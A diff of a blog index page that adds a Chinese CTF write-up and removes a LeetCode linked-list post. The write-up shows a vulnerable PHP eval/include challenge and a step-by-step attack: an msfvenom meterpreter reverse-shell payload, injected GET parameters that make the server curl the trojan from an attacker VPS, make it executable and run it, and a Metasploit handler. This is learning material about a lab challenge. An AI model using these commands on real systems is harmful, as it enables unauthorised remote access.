@@ -166,6 +166,112 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/09/20/mfs%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Paradox">
+      <meta itemprop="description" content="What I have learned">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Paradox's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/20/mfs%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">mfs攻击</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-09-20 00:00:00" itemprop="dateCreated datePublished" datetime="2020-09-20T00:00:00+08:00">2020-09-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-09-27 10:37:06" itemprop="dateModified" datetime="2020-09-27T10:37:06+08:00">2020-09-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="mfs攻击">mfs攻击</h3>
+<p>经历了两天的时间, 我终于(在学长的帮助下)做出了第一道web题!!! 写个博客纪念且记录一下.</p>
+<h4 id="题目环境">题目环境</h4>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/php|flag|zlib|ftp|phar|data|rar|ogg|expe|http|glob|ssh2|\^|\~|\(|\)|\[|\]|\,|\&lt;|\&gt;|\?|\\\|\[|\]|\=|\+|\;|\:|\&#x27;|\&quot;/i&#x27;</span>, $_GET[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">print</span> $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;include &quot;</span> . $_GET[<span class="string">&#x27;url&#x27;</span>] . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//flag is in /flag and The format of flag is flag&#123;xxxx&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="分析">分析</h4>
+<ol start="0" type="1">
+<li>最后一行注释告诉我们本题flag存在<code>/flag</code>中</li>
+<li>由第一行的<code>error_reporting(0)</code>和后面的<code>eval()</code>得知本题是无回显的, 所以要寻找代码中漏洞提取服务器权限来查看<code>/flag</code></li>
+<li>通过仔细观察<code>preg_match</code>函数分析得知参数中绝大部分特殊字符都被过滤, 故插入php代码片段的想法是不可行的</li>
+<li>经学长告知, 该题可以使用<strong>msf</strong> 来向服务器中安装后门木马来拿到flag</li>
+</ol>
+<h4 id="工具原料">工具&amp;原料</h4>
+<ol start="0" type="1">
+<li>一个具有公网ip的设备(我用的vps)</li>
+<li>在上述设备上下载安装mfs</li>
+</ol>
+<h4 id="msf使用及具体构造方法">msf使用及具体构造方法</h4>
+<ol start="0" type="1">
+<li><p>首先通过f12-&gt;network可以观察到服务器环境为debian, 故需要准备linux版本的木马</p></li>
+<li><p>通过 <code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;your_vps_ip&gt; LPORT=&lt;port&gt; -f elf &gt; shell.elf</code> 来创建x64 linux下的木马</p>
+<blockquote>
+<p>由于本题过滤了’:’, 故只能通过80端口来使服务器请求该木马, 所以木马上设置的端口不能为80</p>
+</blockquote></li>
+<li><p>向该题环境发送带参数的GET请求:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;addr&gt;/?url=`curl -o /tmp/shell &lt;your_vps_ip&gt;/shell.elf` # let server download your trojan-horse</span><br><span class="line">&lt;addr&gt;/?url=`chmod 777 /tmp/shell` # make it executable</span><br><span class="line">&lt;addr&gt;/?url=`/tmp/shell` # run it!</span><br></pre></td></tr></table></figure></li>
+<li><p>在题目环境服务器上成功安装并执行木马之后就可以在vps上操作服务器了:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ msfconsole</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST &lt;your_vps_ip&gt;</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT &lt;port&gt;</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure></li>
+<li><p>之后就可以直接运行 <code>cat /flag</code> 拿到flag啦!</p></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/09/17/35.Search%20Insert%20Position/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -948,94 +1054,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://123.57.173.58/2020/08/12/25.%20Reverse%20Nodes%20in%20k-Group/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Paradox">
-      <meta itemprop="description" content="What I have learned">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Paradox's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/08/12/25.%20Reverse%20Nodes%20in%20k-Group/" class="post-title-link" itemprop="url">25. Reverse Nodes in k-Group</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-08-12 00:00:00" itemprop="dateCreated datePublished" datetime="2020-08-12T00:00:00+08:00">2020-08-12</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-27 10:35:17" itemprop="dateModified" datetime="2020-09-27T10:35:17+08:00">2020-09-27</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/leetcode/" itemprop="url" rel="index"><span itemprop="name">leetcode</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="reverse-nodes-in-k-group">25. Reverse Nodes in k-Group</h3>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://leetcode.com/problems/reverse-nodes-in-k-group/">source link</a></p>
-</blockquote>
-<h5 id="description">Description</h5>
-<p>Given a linked list, reverse the nodes of a linked list <em>k</em> at a time and return its modified list.</p>
-<p><em>k</em> is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of <em>k</em> then left-out nodes in the end should remain as it is.</p>
-<h5 id="signature">Signature</h5>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">reverseKGroup</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> k)</span></span>;</span><br></pre></td></tr></table></figure>
-<h5 id="analysis">Analysis</h5>
-<ol start="0" type="1">
-<li>Notice that we need to modify the previous node next ptr for every sublist, so we need a <code>real_head</code>.</li>
-</ol>
-<h5 id="solution">Solution</h5>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct ListNode* <span class="title">reverseKGroup</span><span class="params">(struct ListNode* head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> <span class="title">node</span>;</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span>* <span class="title">node_p</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">NULL</span> || k &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    node real_head;</span><br><span class="line">    real_head.next = head;</span><br><span class="line">    node_p head_ptr = &amp;real_head;</span><br><span class="line">    node_p cur = head_ptr;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        node_p right_node = cur;</span><br><span class="line">        node_p left_node = cur-&gt;next;</span><br><span class="line">        node_p temp;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= k; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (right_node == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> head_ptr-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            right_node = right_node-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            temp = left_node;</span><br><span class="line">            left_node = left_node-&gt;next;</span><br><span class="line">            temp-&gt;next = right_node;</span><br><span class="line">            right_node = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        node_p local = cur-&gt;next;</span><br><span class="line">        cur-&gt;next = right_node;</span><br><span class="line">        cur = local;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1105,7 +1123,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">66</span>
+          <span class="site-state-item-count">67</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
